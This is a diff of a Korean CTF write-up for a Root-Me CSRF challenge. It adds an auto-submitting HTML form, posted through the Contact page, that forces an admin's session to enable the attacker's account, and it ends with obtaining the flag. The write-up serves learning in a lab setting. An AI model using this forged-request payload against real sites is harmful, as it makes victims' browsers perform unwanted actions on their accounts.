@@ -11,6 +11,7 @@
 </html>
 
 문제 서버로 들어가자.
+
 ![image](https://github.com/user-attachments/assets/eea7cd75-a295-4d4b-b4d9-cd98d464479b)
 
 로그인 창이 뜬다.
@@ -34,9 +35,32 @@
 csrf 문제이니 ```Contact```에서 명령어를 입력해서 ```Status``` 체크박스가 체크되게 하면 될것 같다.
 
 구글링을 통해서 form 태크에 접근할 수 있는 명령어들을 찾아 보았다.
-javascript:document.getElementById("id 값").submit 명령어를 사용해서 form태그에 강제 구독하도록 만들면 된다고 한다.
+```python
+<script>
+document.username.submit()
+</script>
+```
+강제로 submit하게 하는 명령어라고 한다.
 
 우선 ```Contact``` 페이지에서 개발자 도구를 열어서 Form 부분 코드를 싹 긁어왔다.
 ![image](https://github.com/user-attachments/assets/c3e8f1b3-d1f2-41c2-b046-84803755110e)
 
-불필요한 태그들을 지우고 뒤에 위에쓴 명령어를 추가해보았다.
+불필요한 태그들을 지우고 ```checkbox```의 ```vaule```를 ```on```으로 바꿔줘었다.
+그리고 뒤에 위에쓴 명령어를 추가해보았다.
+```python
+<html>
+<form name="aaa" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="post" enctype="multipart/form-data">
+		<input type="text" name="username" value="1234">
+		<input type="checkbox" name="status" value="on">
+		</form>
+<script>
+document.aaa.submit()
+</script>
+</html>
+```
+```Contact```에 입력했다. 그리고 ```Private```페이지로 들어가 보았다.
+![image](https://github.com/user-attachments/assets/3fa0b820-291f-4d46-9dc2-40583a07ed5a)
+
+![image](https://github.com/user-attachments/assets/b1e5256e-e863-4bb4-83cd-0a0092e159fa)
+
+FLAG를 얻었다!!!
